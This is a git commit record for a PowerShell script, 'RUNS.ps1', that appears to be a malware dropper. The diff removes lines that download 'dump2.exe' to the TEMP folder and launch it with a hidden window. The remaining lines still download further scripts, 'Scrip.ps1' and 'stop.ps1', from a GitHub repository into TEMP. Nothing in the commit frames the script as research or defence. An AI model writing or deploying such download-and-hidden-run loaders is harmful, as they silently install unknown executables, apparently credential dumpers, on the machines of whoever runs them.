1b72ab670d1ae68201e03918f4dd1dc74b4acb88
cia168168 <147810144+cia168168@users.noreply.github.com>
2024-03-01 18:38:55 +0700

    Update RUNS.ps1

--- RUNS.ps1
+++ RUNS.ps1
@@ -1,10 +1,6 @@
 $url1 = "https://raw.githubusercontent.com/cia168168/folder/main/Scrip.ps1"
 $output1 = "$env:TEMP\MyScript.ps1"
 Invoke-WebRequest -Uri $url1 -OutFile $output1
-$url5 = "https://github.com/cia168168/folder/raw/main/dump2.exe"
-$output5 = "$env:TEMP\dump.exe"
-Invoke-WebRequest -Uri $url5 -OutFile $output5
-Start-Process -FilePath $output5 -WindowStyle Hidden
 $url2 = "https://raw.githubusercontent.com/cia168168/folder/main/stop.ps1"
 $output2 = "$env:TEMP\stop.ps1"
 Invoke-WebRequest -Uri $url2 -OutFile $output2
